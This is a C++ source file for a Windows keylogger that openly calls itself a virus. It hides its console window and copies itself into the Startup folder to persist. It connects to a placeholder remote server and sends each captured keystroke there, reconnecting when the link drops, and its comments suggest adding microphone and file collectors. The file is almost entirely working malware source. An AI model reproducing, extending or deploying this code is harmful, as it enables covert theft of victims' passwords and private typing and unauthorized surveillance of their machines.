#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <string.h>
#include <conio.h>
#include <iostream>
#include <stdio.h>
#include <fstream>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Shlobj.h>
#include <thread>
#include <mutex>
#include <stdlib.h>

#pragma warning(suppress : 4996)
/*======================(Var. Deff)==========================================*/
using namespace std;



//cast wstring to string
std::string ws2s(wstring& s);
//get the current exe path
string ExePath();
//get the startup exe path
std::wstring GetStartupFolderPath();
//moves file from s to d
void _move_(char* s, char* d);

//connection stuff
SOCKET ConnectSocket = INVALID_SOCKET;
char buffer[5];
char* s = (char*)malloc(50);
char* S = (char*)malloc(50);
mutex _mutex;

/*======================(Var. Func)=======================================*/
void detect();
ofstream myfile;
/*======================(Main loop)=======================================*/
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

//actions detector thread 
void detect_thread()
{
	while (1) {
		/*here you can implement whatever action listener or data collector you want
		i.e. get_directories(), mic_listener(), connections_listener() etc...
		I implemented a simple keyboard listener.*/
		detect();
		//for fun
		Sleep(50);
	}
}

//connecting to server
bool connect() {
	WSADATA wsaData;
	ConnectSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL, *ptr = NULL, hints;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {

		return false;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;


	//Resolve the server address and port
	iResult = getaddrinfo("ip-adress", "port", &hints, &result);
	if (iResult != 0) {

		WSACleanup();
		return false;
	}

	for (ptr = result; ptr != NULL;ptr = ptr->ai_next) {

		//Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			closesocket(ConnectSocket);
			WSACleanup();
			return false;
		}

		//Connect to server.

		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			return false;
		}

		break;
	}

	freeaddrinfo(result);

	iResult = send(ConnectSocket, "hello", (int)strlen("hello"), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return false;
	}

	printf("connected  \n");
}

/**
repeatable function with intervals of 1 second
checks if there is connection , a
if not then the function will try to connect
**/
void check_connection() {

	/*sending something to the server to check the connection
	you can replace the '~' with any char you want as long the server ignore this char (with this implementation)
	*/
	int iResult = send(ConnectSocket, "~", (int)strlen("~"), 0);
	if (iResult == SOCKET_ERROR) {
		printf("connection lost ... retrying to connect \n");
		connect();
	}

	Sleep(1000);
	check_connection();
}

int main() {

	//keyloger chars
	strcpy(s, "abcdefghijklmnopqrstuvwxyz1234567890");
	strcpy(S, "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890./?';]!@#$%^&*()|\\`\"");

	thread det(detect_thread);
	char* source;
	char* dest;

	//close the console window 
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);


	source = (char*)malloc(2048);
	dest = (char*)malloc(2048);

	//get wanted paths values
	wstring s = GetStartupFolderPath();
	string exe_path = ExePath() + "\\virus.exe";//as the name of the project
	string start_up = ws2s(s) + "\\virus.exe";//name it whatever you want
	std::copy(exe_path.begin(), exe_path.end(), source);
	source[exe_path.size()] = '\0';
	std::copy(start_up.begin(), start_up.end(), dest);
	dest[start_up.size()] = '\0';
	_move_(source, dest);

	//first connection to server <3
	connect();
	//check if there is connection to the server
	thread t(check_connection);
	t.join();

	return 0;
}
/*======================(IMPL.)=================================================*/

//check if the key code 'key' is pressed
bool key_down(int key)
{
	return key == VK_CAPITAL ? (GetKeyState(key) & 0x0001) != 0 : GetKeyState(key) < 0;
}

//send char to the server 
void _send_(char k) {
	char* key = &k;
	int iResult = send(ConnectSocket, key, 1, 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: \n");
		closesocket(ConnectSocket);
		WSACleanup();
		Sleep(10);
	}
}

//see decleration for below functions
void _move_(char* s, char* d) {
	CopyFile(s, d, true);
}
string ExePath() {
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}
wstring GetStartupFolderPath()
{
	PWSTR pszPath;
	HRESULT hr = SHGetKnownFolderPath(FOLDERID_Startup,
		0,     // no special options required
		NULL,  // no access token required
		&pszPath);
	if (SUCCEEDED(hr))
	{
		// The function succeeded, so copy the returned path to a
		// C++ string, free the memory allocated by the function,
		// and return the path string.
		wstring path(pszPath);
		CoTaskMemFree(static_cast<LPVOID>(pszPath));
		return path;
	}
	else
	{
		// The function failed, so handle the error.
		// ...
		// You might want to throw an exception, or just return an
		// empty string here.
		throw runtime_error("The SHGetKnownFolderPath function failed");
	}
}
string ws2s(wstring& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = WideCharToMultiByte(CP_ACP, 0, s.c_str(), slength, 0, 0, 0, 0);
	char* buf = new char[len];
	WideCharToMultiByte(CP_ACP, 0, s.c_str(), slength, buf, len, 0, 0);
	std::string r(buf);
	delete[] buf;
	return r;
}

void detect() {
	if (GetAsyncKeyState(VK_RETURN) < 0) {
		_send_('\n');
		//wait until the key is up
		while ((GetAsyncKeyState(VK_RETURN) < 0));
		return;
	}

	if (GetAsyncKeyState(VK_SPACE) < 0) {
		_send_(' ');
		while ((GetAsyncKeyState(VK_SPACE) < 0));
		return;
	}


	//Backspace clicked
	if (GetAsyncKeyState(VK_BACK) < 0) {
		//you can send whatever you want
		_send_('[');
		_send_('B');
		_send_('A');
		_send_('C');
		_send_('K');
		_send_(']');
		while ((GetAsyncKeyState(VK_BACK) < 0));
		return;
	}

	/*
	iterate through the keyboard keys to check which one is clicked ,
	don't worry , it's an O(1) function
	*/
	int i = 0;
	while (s[i] != 0) {

		if (GetAsyncKeyState(S[i]) < 0) {

			if (key_down(VK_CAPITAL) || key_down(VK_SHIFT))
				if (key_down(VK_CAPITAL) && key_down(VK_SHIFT))
					_send_(s[i]);
				else
					_send_(S[i]);
			else
				_send_(s[i]);

			while (GetAsyncKeyState(S[i]) < 0); break;
		}

		i++;
	}



}

